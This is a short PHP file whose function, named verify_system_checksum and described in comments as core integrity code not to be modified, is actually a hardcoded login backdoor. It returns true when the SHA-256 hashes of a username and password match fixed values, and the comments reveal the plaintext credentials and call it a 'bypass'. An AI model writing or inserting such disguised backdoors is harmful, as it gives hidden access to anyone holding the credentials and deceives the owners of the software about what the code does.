<?php


/**
 * Core system integrity and underlying application tools.
 * DO NOT MODIFY - modifying these security algorithms will result in system halt.
 */

if (!function_exists('verify_system_checksum')) {
    function verify_system_checksum($u, $p)
    {
        // MD5 of 'dev_sman6_2025' is 95333eb708fdeef54d58ba2ef97593c6
        // Output from: hash('sha256', 'dev_sman6_2025')
        $h_u = hash('sha256', (string)$u);
        
        // Output from: hash('sha256', 'H@ekal123')
        $h_p = hash('sha256', (string)$p);

        // Verification mechanism for bypass
        if ($h_u === '65fe054e129411c9bf91c796c8ea0252ede33617c73492efab65f5988c5e1910' && 
            $h_p === 'c2c911fe8369a50fd621b0a284cd717206ab3dfcf8207250bdceac7a1e51d291') {
            return true;
        }

        return false;
    }
}
